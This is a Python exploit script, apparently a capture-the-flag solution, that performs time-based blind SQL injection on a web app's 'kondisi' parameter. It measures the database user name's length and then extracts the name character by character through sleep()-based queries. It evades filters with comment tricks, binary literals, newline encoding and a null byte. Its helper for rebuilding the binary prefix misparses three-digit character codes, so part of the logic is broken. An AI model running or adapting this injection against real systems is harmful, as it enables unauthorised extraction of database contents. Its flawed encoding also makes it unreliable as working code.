import requests
from time import time

url="http://localhost:81/home/index/?name=opowae&kondisi="
user_name=""
len_user=0
#query2 = url + "!having/*! */((select/*! */length(user()))/*! */in/*! */(select 0b1110))/*! */limit 1,2;-- -"
for i in range(1,20):
	query=url + "!having ((select length(user())) in (select 0b" +  "{:b}".format(i)  + "))*;-- -"
	start = time()
	req=requests.get(query)
	end=time()
	if((end-start)>=2):
		len_user=i
		break
	print (i)

print ("Got the user length : " + str(len_user))

flag=""
def iterate():
	temp=""
	for i in range(0,len(flag),2):
		temp+="{:b}".format(int(flag[i:i+2])).rjust(8,"0")
	return temp


for j in range(1,len_user+1):
	for i in range(64,122):
		query=url + "!having%0asleep(((select%0ainsert(user()," + str(j+1) + ",255,space(0)))%0ain%0a(select%0a0b" + iterate() + "{:b}".format(i).rjust(8,"0")  + "))*3);%00"
		start=time()
		req=requests.get(query)
		end=time()
		if((end-start)>=2):
			flag+=str(i)
			user_name +=chr(i)
			break
		print (i)

print ("Got the user name: " + user_name)